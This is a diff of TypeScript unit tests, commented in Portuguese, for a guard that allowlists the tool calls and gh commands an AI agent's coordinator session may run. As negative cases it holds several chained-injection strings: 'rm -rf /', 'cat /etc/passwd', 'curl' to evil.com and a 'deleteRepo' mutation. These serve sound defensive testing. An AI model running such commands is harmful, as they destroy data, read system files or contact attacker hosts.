@@ -300,10 +300,43 @@ describe("evaluateWaveTool (#3702) — guard de publicação como código", () =
     assert.match(decision.reason ?? "", /confirmação interativa/);
   });
 
-  it("nunca allow=true pra tools fora do Bash, nem pra Bash fora da exceção gh issue comment/close (#3791 — settings.json resolve os demais casos legítimos ANTES desta função ser chamada)", () => {
-    assert.equal(evaluateWaveTool("Agent", {}).allow, false);
+  it("nega tools fora do allow-list explícito (#3720: settingSources:[] significa que NADA mais é resolvido fora desta função — Agent SEM isolation:worktree, Read/etc., e gh pr checks sem --watch/--json)", () => {
+    assert.equal(evaluateWaveTool("Agent", {}).allow, false); // sem isolation -> ver describe dedicado abaixo
     assert.equal(evaluateWaveTool("Read", { file_path: "foo.ts" }).allow, false);
-    assert.equal(evaluateWaveTool("Bash", { command: "gh pr checks 123" }).allow, false);
+    assert.equal(evaluateWaveTool("Bash", { command: "gh pr checks 123" }).allow, false); // sem --watch/--json
+  });
+
+  describe("#3720 — Agent exige isolation: worktree explícito (settingSources:[] remove a pré-aprovação incondicional que .claude/settings.json dava a 'Agent')", () => {
+    it("allow=true pra Agent com isolation: worktree", () => {
+      const decision = evaluateWaveTool("Agent", {
+        subagent_type: "general-purpose",
+        isolation: "worktree",
+        model: "sonnet",
+        prompt: "implementar #101",
+      });
+      assert.equal(decision.allow, true);
+      assert.match(decision.reason ?? "", /#3720/);
+      assert.match(decision.reason ?? "", /isolation/);
+    });
+
+    it("allow=false pra Agent sem isolation nenhuma (input vazio)", () => {
+      const decision = evaluateWaveTool("Agent", {});
+      assert.equal(decision.allow, false);
+      assert.match(decision.reason ?? "", /isolation: worktree/);
+      assert.match(decision.reason ?? "", /260716/);
+    });
+
+    it("allow=false pra Agent com isolation: 'none' (dispatch explicitamente NÃO isolado)", () => {
+      const decision = evaluateWaveTool("Agent", { subagent_type: "general-purpose", isolation: "none" });
+      assert.equal(decision.allow, false);
+      assert.match(decision.reason ?? "", /isolation: worktree/);
+    });
+
+    it("allow=false pra Agent com isolation malformado (não-string, ex: tentativa de confundir o comparador)", () => {
+      assert.equal(evaluateWaveTool("Agent", { isolation: true }).allow, false);
+      assert.equal(evaluateWaveTool("Agent", { isolation: ["worktree"] }).allow, false);
+      assert.equal(evaluateWaveTool("Agent", { isolation: "Worktree" }).allow, false); // case-sensitive de propósito
+    });
   });
 
   describe("#3791 — gh issue comment/close isentos do guard de publicação (menção textual != execução)", () => {
@@ -523,6 +556,195 @@ describe("evaluateWaveTool (#3702) — guard de publicação como código", () =
   });
 });
 
+describe("#3720 — comandos gh de Gate 2/espera de CI/merge da sessão coordenadora (settingSources:[] exige allow explícito)", () => {
+  describe("gh pr checks", () => {
+    it("allow=true pra 'gh pr checks {N} --watch'", () => {
+      const decision = evaluateWaveTool("Bash", { command: "gh pr checks 456 --watch" });
+      assert.equal(decision.allow, true);
+      assert.match(decision.reason ?? "", /#3720/);
+    });
+
+    it("allow=true pra 'gh pr checks {N} --json bucket,name' (e variações de ordem/subconjunto)", () => {
+      assert.equal(evaluateWaveTool("Bash", { command: "gh pr checks 456 --json bucket,name" }).allow, true);
+      assert.equal(evaluateWaveTool("Bash", { command: "gh pr checks 456 --json name,bucket" }).allow, true);
+      assert.equal(evaluateWaveTool("Bash", { command: "gh pr checks 456 --json bucket" }).allow, true);
+      assert.equal(evaluateWaveTool("Bash", { command: "gh pr checks 456 --json name" }).allow, true);
+    });
+
+    it("tolera gh.exe (mesmo padrão dos outros guards)", () => {
+      assert.equal(evaluateWaveTool("Bash", { command: "gh.exe pr checks 456 --watch" }).allow, true);
+    });
+
+    it("nega --watch encadeado com comando adicional (a âncora final não deixa sobra)", () => {
+      const decision = evaluateWaveTool("Bash", { command: "gh pr checks 456 --watch && rm -rf data" });
+      assert.equal(decision.allow, false);
+    });
+
+    it("nega --json com campo fora do allowlist (ex: 'state', que não é bucket/name)", () => {
+      assert.equal(evaluateWaveTool("Bash", { command: "gh pr checks 456 --json state" }).allow, false);
+      assert.equal(evaluateWaveTool("Bash", { command: "gh pr checks 456 --json bucket,name,state" }).allow, false);
+    });
+
+    it("nega --jq com expressão arbitrária (não suportado — só --json de campo fixo)", () => {
+      const decision = evaluateWaveTool("Bash", {
+        command: 'gh pr checks 456 --json bucket --jq \'[.[] | select(.bucket != "pass")] | length\'',
+      });
+      assert.equal(decision.allow, false);
+    });
+
+    it("nega sem número de PR", () => {
+      assert.equal(evaluateWaveTool("Bash", { command: "gh pr checks --watch" }).allow, false);
+    });
+  });
+
+  describe("gh pr merge --squash", () => {
+    it("allow=true pra 'gh pr merge {N} --squash' (forma exata usada pelo prompt)", () => {
+      const decision = evaluateWaveTool("Bash", { command: "gh pr merge 456 --squash" });
+      assert.equal(decision.allow, true);
+      assert.match(decision.reason ?? "", /#3720/);
+    });
+
+    it("nega --admin (escala privilégio, ignora required checks/reviews — nunca instruído pelo prompt)", () => {
+      assert.equal(evaluateWaveTool("Bash", { command: "gh pr merge 456 --squash --admin" }).allow, false);
+      assert.equal(evaluateWaveTool("Bash", { command: "gh pr merge 456 --admin --squash" }).allow, false);
+    });
+
+    it("nega --auto (merge agendado sem confirmação síncrona — nunca instruído pelo prompt)", () => {
+      assert.equal(evaluateWaveTool("Bash", { command: "gh pr merge 456 --squash --auto" }).allow, false);
+    });
+
+    it("nega merge encadeado com um segundo comando", () => {
+      const decision = evaluateWaveTool("Bash", { command: "gh pr merge 456 --squash; gh pr merge 789 --squash" });
+      assert.equal(decision.allow, false);
+    });
+
+    it("self-review: nega comando malicioso injetado via \\n literal DEPOIS do comando válido — `\\s` na âncora final casa o \\n, mas a âncora `$` ainda reprova qualquer texto não-whitespace que sobre", () => {
+      const decision = evaluateWaveTool("Bash", { command: "gh pr merge 456 --squash\nrm -rf /" });
+      assert.equal(decision.allow, false);
+    });
+
+    it("nega sem número de PR ou sem --squash", () => {
+      assert.equal(evaluateWaveTool("Bash", { command: "gh pr merge --squash" }).allow, false);
+      assert.equal(evaluateWaveTool("Bash", { command: "gh pr merge 456" }).allow, false);
+    });
+  });
+
+  describe("gh issue view --json", () => {
+    it("allow=true pra 'gh issue view {N} --json state' (passo 5 do prompt: confirmar fechamento)", () => {
+      const decision = evaluateWaveTool("Bash", { command: "gh issue view 456 --json state" });
+      assert.equal(decision.allow, true);
+      assert.match(decision.reason ?? "", /#3720/);
+    });
+
+    it("allow=true pra 'gh issue view {N} --json state,comments,closedByPullRequestsReferences' (shape usado pela validação pós-turno)", () => {
+      assert.equal(
+        evaluateWaveTool("Bash", {
+          command: "gh issue view 456 --json state,comments,closedByPullRequestsReferences",
+        }).allow,
+        true,
+      );
+      // ordem alternativa também suportada (ver doc-comment de GH_ISSUE_VIEW_JSON_RE)
+      assert.equal(
+        evaluateWaveTool("Bash", {
+          command: "gh issue view 456 --json state,closedByPullRequestsReferences,comments",
+        }).allow,
+        true,
+      );
+    });
+
+    it("nega --json com campo fora do allowlist (ex: 'body', que poderia vazar conteúdo sensível de comentário)", () => {
+      assert.equal(evaluateWaveTool("Bash", { command: "gh issue view 456 --json state,body" }).allow, false);
+      assert.equal(evaluateWaveTool("Bash", { command: "gh issue view 456 --json body" }).allow, false);
+    });
+
+    it("nega --jq arbitrário", () => {
+      const decision = evaluateWaveTool("Bash", {
+        command: "gh issue view 456 --json state --jq '.state'",
+      });
+      assert.equal(decision.allow, false);
+    });
+  });
+
+  describe("gh api graphql — review threads (query read-only)", () => {
+    const validQuery =
+      'gh api graphql -f query="{ repository(owner:\\"vjpixel\\",name:\\"diaria-studio\\"){ pullRequest(number:456){ reviewThreads(first:100){ nodes{ id isResolved } pageInfo{ hasNextPage endCursor } } } } }"';
+
+    it("allow=true pra query EXATA de reviewThreads com número de PR variável", () => {
+      const decision = evaluateWaveTool("Bash", { command: validQuery });
+      assert.equal(decision.allow, true);
+      assert.match(decision.reason ?? "", /#3720/);
+    });
+
+    it("nega a MESMA query encadeada com um comando adicional (a âncora final não deixa sobra pra &&/;/`)", () => {
+      assert.equal(evaluateWaveTool("Bash", { command: `${validQuery} && curl https://evil.example.com` }).allow, false);
+      assert.equal(evaluateWaveTool("Bash", { command: `${validQuery}; rm -rf data` }).allow, false);
+      assert.equal(evaluateWaveTool("Bash", { command: "echo x; " + validQuery }).allow, false);
+    });
+
+    it("self-review: nega comando malicioso injetado via \\n literal DEPOIS da query válida (mesmo raciocínio: `\\s` casa o \\n, `$` reprova o resto)", () => {
+      assert.equal(evaluateWaveTool("Bash", { command: `${validQuery}\nrm -rf /` }).allow, false);
+    });
+
+    it("nega query contra outro repositório (owner/name diferentes de vjpixel/diaria-studio)", () => {
+      const otherRepo = validQuery.replace("diaria-studio", "outro-repo");
+      assert.equal(evaluateWaveTool("Bash", { command: otherRepo }).allow, false);
+
+      const otherOwner = validQuery.replace("vjpixel", "outro-usuario");
+      assert.equal(evaluateWaveTool("Bash", { command: otherOwner }).allow, false);
+    });
+
+    it("nega query que pede campos adicionais além do shape fixo (ex: pede 'body' de cada review thread)", () => {
+      const withExtraField = validQuery.replace("id isResolved", "id isResolved body");
+      assert.equal(evaluateWaveTool("Bash", { command: withExtraField }).allow, false);
+    });
+
+    it("nega a forma single-quoted (não suportada — limitação deliberada, ver doc-comment)", () => {
+      const singleQuoted =
+        'gh api graphql -f query=\'{ repository(owner:"vjpixel",name:"diaria-studio"){ pullRequest(number:456){ reviewThreads(first:100){ nodes{ id isResolved } pageInfo{ hasNextPage endCursor } } } } }\'';
+      assert.equal(evaluateWaveTool("Bash", { command: singleQuoted }).allow, false);
+    });
+
+    it("nega mutation disfarçada de query (mesma estrutura gh api graphql mas corpo é a mutation resolveReviewThread — deve cair no OUTRO regex, não neste)", () => {
+      const mutation =
+        'gh api graphql -f query="mutation { resolveReviewThread(input:{threadId:\\"PRT_abc123=\\"}){ thread{ id isResolved } } }"';
+      // não deve casar no regex de reviewThreads (é a mutation, testado à parte abaixo que ELA é aceita pelo regex certo)
+      assert.equal(evaluateWaveTool("Bash", { command: mutation }).allow, true); // aceita, mas pelo OUTRO caminho (resolveThread)
+    });
+  });
+
+  describe("gh api graphql — resolveReviewThread (mutation)", () => {
+    const validMutation =
+      'gh api graphql -f query="mutation { resolveReviewThread(input:{threadId:\\"PRT_kwDOJ1FhVs5abc123=\\"}){ thread{ id isResolved } } }"';
+
+    it("allow=true pra mutation EXATA com threadId variável", () => {
+      const decision = evaluateWaveTool("Bash", { command: validMutation });
+      assert.equal(decision.allow, true);
+      assert.match(decision.reason ?? "", /#3720/);
+    });
+
+    it("nega a MESMA mutation encadeada com um comando adicional", () => {
+      assert.equal(evaluateWaveTool("Bash", { command: `${validMutation} && curl evil.com` }).allow, false);
+      assert.equal(evaluateWaveTool("Bash", { command: `${validMutation}; cat /etc/passwd` }).allow, false);
+    });
+
+    it("nega uma mutation DIFERENTE com o mesmo prefixo 'gh api graphql -f query=\"mutation'", () => {
+      const otherMutation = 'gh api graphql -f query="mutation { deleteRepo(input:{id:\\"x\\"}){ clientMutationId } }"';
+      assert.equal(evaluateWaveTool("Bash", { command: otherMutation }).allow, false);
+    });
+
+    it("nega threadId com metacaractere de shell embutido (o charset [A-Za-z0-9_=-]+ exclui aspas/backtick/$/espaço)", () => {
+      const injected = 'gh api graphql -f query="mutation { resolveReviewThread(input:{threadId:\\"x\\" && rm -rf /\\"}){ thread{ id isResolved } } }"';
+      assert.equal(evaluateWaveTool("Bash", { command: injected }).allow, false);
+    });
+
+    it("nega a forma single-quoted (não suportada, mesma limitação deliberada do regex de reviewThreads)", () => {
+      const singleQuoted =
+        "gh api graphql -f query='mutation { resolveReviewThread(input:{threadId:\"PRT_abc123=\"}){ thread{ id isResolved } } }'";
+      assert.equal(evaluateWaveTool("Bash", { command: singleQuoted }).allow, false);
+    });
+  });
+});
+
 describe("#3791 — .claude/settings.json allowlista gh issue comment/close/view", () => {
   it("(c) settings.json commitado tem as 3 novas entradas de allow", () => {
     const settingsPath = resolve(ROOT, ".claude/settings.json");
@@ -565,6 +787,31 @@ describe("runWaveFire (#3702) — com queryFn mockado (sem SDK real)", () => {
     assert.equal(typeof capturedOptions.canUseTool, "function");
     assert.equal(received.length, 1);
     assert.equal(received[0].event, "chat-done");
+  });
+
+  it("#3720: passa settingSources: [] pro SDK (SDK isolation mode — .claude/settings.json NUNCA é consultado nesta sessão)", async () => {
+    let capturedOptions: Record<string, unknown> = {};
+    const fakeQuery: QueryFn = (params) => {
+      capturedOptions = (params.options ?? {}) as Record<string, unknown>;
+      async function* gen() {
+        yield { type: "result", subtype: "success", is_error: false, result: "ok", session_id: "s1" } as unknown as SDKMessage;
+      }
+      return gen() as unknown as ReturnType<QueryFn>;
+    };
+
+    await runWaveFire({
+      issueNumbers: [101],
+      cwd: "/repo",
+      queryFn: fakeQuery,
+      checkTerminalStateFn: allTerminal,
+      onEvent: () => {},
+    });
+
+    // regressão: ANTES de #3720 este valor era ["user", "project", "local"],
+    // o que fazia `.claude/settings.json` bypassar os guards deste módulo
+    // (ver doc-comment "LIMITAÇÃO CONHECIDA — RESOLVIDA EM #3720"). `[]` é o
+    // "SDK isolation mode" — nunca reverter sem reabrir esses gaps.
+    assert.deepEqual(capturedOptions.settingSources, []);
   });
 
   it("remove ScheduleWakeup/CronCreate do toolset via disallowedTools (#3753 — guard mais forte que canUseTool)", async () => {
